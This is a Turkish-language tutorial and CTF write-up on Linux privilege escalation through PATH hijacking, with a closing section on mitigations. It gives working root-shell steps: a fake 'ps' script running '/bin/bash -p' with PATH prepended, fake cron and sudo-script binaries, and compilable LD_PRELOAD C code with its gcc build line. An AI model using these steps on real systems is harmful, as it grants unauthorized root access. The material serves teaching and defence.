# Linux Yetki Yükseltme: PATH Değişkeni Manipülasyonu (PATH Hijacking)

PATH Hijacking (PATH Değişkeni Manipülasyonu), bir Linux sisteminde yetki yükseltmek için kullanılan en temel, en yaygın ve en etkili yöntemlerden biridir. Bu teknik, yüksek yetkilerle çalışan bir sürecin (örneğin, SUID bitine sahip bir program, `root` tarafından çalıştırılan bir cron job veya bir sistem servisi), başka bir komutu tam yolunu belirtmeden çağırması durumunda ortaya çıkar.

Bu rehber, tekniğin temel mantığını, nasıl tespit edileceğini ve farklı senaryolarda nasıl istismar edileceğini, gerçek bir CTF vaka analizi üzerinden detaylı bir şekilde anlatmaktadır.

---

## ⚙️ Temel Prensip: PATH'in Anatomisi

PATH, bir komut yazdığınızda (`ls`, `ps`, `cat` gibi), sistemin bu komuta ait çalıştırılabilir dosyayı hangi dizinlerde arayacağını belirten, iki nokta üst üste (`:`) ile ayrılmış bir dizin listesidir. Bu listeyi, sistemin "komutlar için adres defteri" olarak düşünebilirsiniz.

`echo $PATH` komutuyla kendi `PATH` değişkeninizi görebilirsiniz:
```bash
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Bir komut arandığında, sistem bu listedeki adreslere sırayla, soldan sağa doğru bakar:
1.  `/usr/local/sbin` içinde var mı?
2.  Yoksa, `/usr/local/bin` içinde var mı?
3.  ...ve bu şekilde devam eder.

**Zafiyetin doğduğu an şudur:** Eğer biz, bu arama sırasının **en başına** kendi kontrolümüzdeki bir dizini (`/tmp` gibi) ekleyebilirsek, sistem komutları ararken ilk olarak bizim dizinimize bakmak zorunda kalır.

Eğer bu sırada `root` yetkileriyle çalışan bir program, `/bin/ps` gibi tam yolu belirtmek yerine sadece `ps` komutunu çağırırsa, ne olur?
1.  Sistem, `ps` komutunu `PATH` listesinde aramaya başlar.
2.  Listenin en başında bizim eklediğimiz `/tmp` dizini olduğu için, önce `/tmp/ps` dosyasını kontrol eder.
3.  Eğer biz oraya `ps` adında zararlı bir script koyduysak, sistem onu bulur ve `root` yetkileriyle çalıştırır. Asıl `/bin/ps` komutuna hiç sıra gelmez.

İşte buna **PATH Hijacking (PATH'i Ele Geçirme)** denir.

---

## 🎯 Vaka Analizi: Bir CTF Macerası

Bu tekniğin ne kadar etkili ve bazen ne kadar yanıltıcı olabileceğini, adım adım çözdüğümüz bir CTF senaryosu üzerinden inceleyelim.

**Giriş:** Bir CTF yarışmasında, `user` adında düşük yetkili bir kullanıcı olarak sisteme sızdık. Amacımız `root` olmak.

### Adım 1: İlk Keşif ve Yanıltmaç (The Red Herring)

Sisteme girer girmez, yetkilerimizi kontrol etmek için standart komutu çalıştırdık: `sudo -l`. Çıktı, bize altın tepside bir fırsat sunuyor gibiydi:
```
User user may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/sudoedit /home/*/*/esc.txt
```
Bu yol, bariz bir şekilde yetki yükseltme yolu gibi duruyordu. Ancak günlerce süren denemelerimiz hatalarla sonuçlandı:
*   **Symlink Saldırısı:** `sudoedit`'in modern versiyonu "editing symbolic links is not permitted" diyerek bunu engelledi.
*   **Editörden Kaçış:** "Can't open file for writing" hatası aldık. Bu hata, `sudoedit`'in editörü `root` olarak değil, bizim kendi `user` yetkilerimizle çalıştırdığını kanıtladı.

**Sonuç:** `sudoedit` yolu, bizi asıl zafiyetten uzaklaştırmak için tasarlanmış, çok zekice hazırlanmış bir **yanıltmaç (Red Herring)** idi.

### Adım 2: Gerçek Zafiyete Dönüş

Yanıltmacı fark edince, temel prensiplere geri döndük: **detaylı enumerasyon**. SUID bitine sahip dosyaları aradık:
```bash
find / -perm -u=s -type f 2>/dev/null
```
Liste uzun olsa da, standart Linux dosyaları arasında bir tane yabancı parlıyordu: `/bin/get_ps`. Onu analiz etmeye karar verdik:
```bash
strace /bin/get_ps
```
`strace` komutu, bir programın yaptığı tüm sistem çağrılarını listeler. Çıktıda şu kritik satırı gördük:
```
execve("ps", ["ps"], 0x7ffd1bfc6b10) = -1 ENOENT (No such file or directory)
```
Bu çıktı, `/bin/get_ps` programının `ps` komutunu **tam yolunu belirtmeden** çağırdığını kanıtlıyordu. Bingo! Aradığımız zafiyet buydu.

### Adım 3: Kusursuz İstismar (The Exploit)

Artık planımız netti:
1.  **Saldırı Alanı Hazırlama:** Herkesin yazabildiği `/tmp` dizinine geçtik.
    ```bash
    cd /tmp
    ```
2.  **Sahte Komutu Yaratma:** `ps` adında bir dosya oluşturduk ve içine `root` kabuğu alacak komutu yazdık.
    ```bash
    echo "/bin/bash -p" > ps
    ```
    *(Not: `-p` bayrağı, `bash`'in SUID bitiyle çalıştırıldığında yetkilerini düşürmesini engeller. Bu yüzden çok kritiktir.)*

3.  **İzinleri Ayarlama:** Sahte script'imizi çalıştırılabilir hale getirdik.
    ```bash
    chmod +x ps
    ```
4.  **PATH'i Ele Geçirme:** Mevcut dizini (`.`), `PATH`'in en başına ekledik. Bu, en kritik adımdı.
    ```bash
    export PATH=.:$PATH
    ```
5.  **Tetiği Çekme:** Zafiyetli programı çalıştırdık.
    ```bash
    /bin/get_ps
    ```
Anında, komut satırı `user@ubuntu:~$`'dan `root@ubuntu:/tmp#`'a dönüştü. Başarıyla `root` olmuştuk!

---

## 🌐 Diğer Yaygın Senaryolar

### Senaryo 2: Yanlış Yapılandırılmış Cron Job'lar

`root` kullanıcısının zamanlanmış görevleri, PATH manipülasyonu için verimli bir zemin oluşturur.

*   **Tespit:** `/etc/crontab` dosyasını veya diğer cron dosyalarını (`/etc/cron.d/`, `/var/spool/cron/`) incele. `PATH` değişkeninin en başta tanımlanmadığı ve yolu belirtilmemiş komutlar içeren script'ler ara.
    ```
    * * * * * root /usr/local/bin/backup.sh
    ```
    Eğer `backup.sh` dosyasının içeriği `tar -czf /backups/archive.tgz *` gibi bir komut içeriyorsa, `tar` komutunun yolu belirtilmemiştir.
*   **İstismar:** `tar` adında sahte bir script oluşturup (`echo "/path/to/reverse_shell" > tar`), `chmod +x tar` ile izin verip, `export PATH=/tmp:$PATH` yaptıktan sonra cron job'un çalışmasını beklersin. Genellikle bu senaryoda interaktif kabuk yerine **reverse shell** tercih edilir.

### Senaryo 3: Sistem Servisleri ve Başlangıç Script'leri

Birçok sistem servisi veya başlangıç script'i (`init.d` veya `systemd`) `root` olarak çalışır. Eğer bu script'ler içindeki komutlar tam yoluyla belirtilmemişse, aynı teknik uygulanabilir.

*   **Tespit:** `systemd` servis dosyalarını (`/etc/systemd/system/`) veya eski `init.d` script'lerini (`/etc/init.d/`) incele. `ExecStart`, `ExecReload` gibi satırlarda yolu belirtilmemiş komutlar ara.
*   **İstismar:** Mantık tamamen aynıdır. Hedef komutun adıyla sahte bir script oluştur ve PATH'i ele geçir. Sistem yeniden başladığında veya servis yeniden yüklendiğinde kodun tetiklenir.

### Senaryo 4: Yüksek Yetkili Kullanıcıların Kabuk Script'leri

Bazen `root` kullanıcısı, sistem yönetimi için basit kabuk script'leri kullanır. Eğer bu script'lerden birini çalıştırma yetkiniz varsa (örn: `sudo /usr/local/bin/create_user.sh`) ve script içindeki komutların yolu belirtilmemişse bu zafiyet ortaya çıkar.

*   **Örnek:** `create_user.sh` script'i içinde `id -u $1` gibi bir komut olsun.
*   **İstismar:** `id` adında sahte bir script oluştur, PATH'i ele geçir ve `sudo /usr/local/bin/create_user.sh test` komutunu çalıştır.

### Senaryo 5: İleri Düzey - `LD_PRELOAD` ile Kütüphane Ele Geçirme

Bu, PATH Hijacking'in bir varyasyonudur ama dosya yolu yerine paylaşılan kütüphaneleri hedefler. `LD_PRELOAD`, bir program başlamadan önce hangi paylaşılan kütüphanelerin (`.so` dosyaları) yükleneceğini belirten bir ortam değişkenidir.

*   **Zafiyet:** Eğer bir SUID programı çalıştırırken `LD_PRELOAD` değişkenini korumuyorsa (genellikle modern sistemler bunu engeller), programın normalde kullandığı bir kütüphane fonksiyonunu (örn: `printf`) kendi zararlı kodumuzla değiştirebiliriz.
*   **İstismar:**
    1.  Zararlı kodu içeren bir C dosyası yazılır.
        ```c
        // hijack.c
        #include <stdio.h>
        #include <stdlib.h>
        
        void _init() {
            unsetenv("LD_PRELOAD");
            system("/bin/bash -p");
        }
        ```
    2.  Bu dosya paylaşılan bir kütüphane olarak derlenir.
        ```bash
        gcc -fPIC -shared -o hijack.so hijack.c -nostartfiles
        ```
    3.  `LD_PRELOAD` değişkeni ayarlanarak SUID programı çalıştırılır.
        ```bash
        LD_PRELOAD=/tmp/hijack.so /path/to/suid_binary
        ```
    Bu teknik daha nadirdir ancak bulunduğunda çok güçlüdür.

---

## 🔍 Zafiyeti Tespit Etme (Genel Yöntemler)

*   **Manuel Kontroller:**
    *   **SUID/GUID:** `find / -perm -u=s -type f 2>/dev/null`
    *   **Sudo Yetkileri:** `sudo -l`
    *   **Cron Jobs:** `cat /etc/crontab`, `ls -l /etc/cron.d/`
    *   **Servisler:** `ls -l /etc/systemd/system`, `ls -l /etc/init.d/`
    *   **String/Strace Analizi:** `strings` ve `strace` komutları ile şüpheli dosyaları analiz et.

*   **Otomatik Araçlar:**
    `linpeas.sh`, `LinEnum.sh` gibi scriptler bu ve benzeri birçok zafiyeti otomatik olarak tarar ve size renkli çıktılarla raporlar. Yetki yükseltme sürecinde bu araçları kullanmak zaman kazandırır.

---

## 🛡️ Korunma Yolları (Mitigation)

1.  **Her Zaman Mutlak Yol Kullanın:** Ayrıcalıklı (privileged) script veya programlar yazan geliştiriciler ve sistem yöneticileri, `ls` yerine `/bin/ls`, `tar` yerine `/bin/tar` gibi komutların tam yollarını kullanmalıdır. Bu, PATH manipülasyonunu imkansız hale getirir.
2.  **Güvenli PATH Tanımlayın:** Script'lerin en başında, dışarıdan gelen `PATH` değişkenine güvenmek yerine, `PATH=/usr/bin:/bin:/usr/sbin:/sbin` gibi güvenli ve kısıtlı bir `PATH` değişkeni yeniden tanımlanmalıdır.
3.  **En Az Yetki Prensibi:** Bir programa gerçekten gerekmiyorsa asla SUID biti verilmemelidir.
4.  **Güvenli Kodlama Pratikleri:** `sudoers` dosyasında `secure_path` direktifinin ayarlı olduğundan emin olun. Bu, `sudo` ile çalıştırılan komutlar için güvenli bir PATH tanımlar.
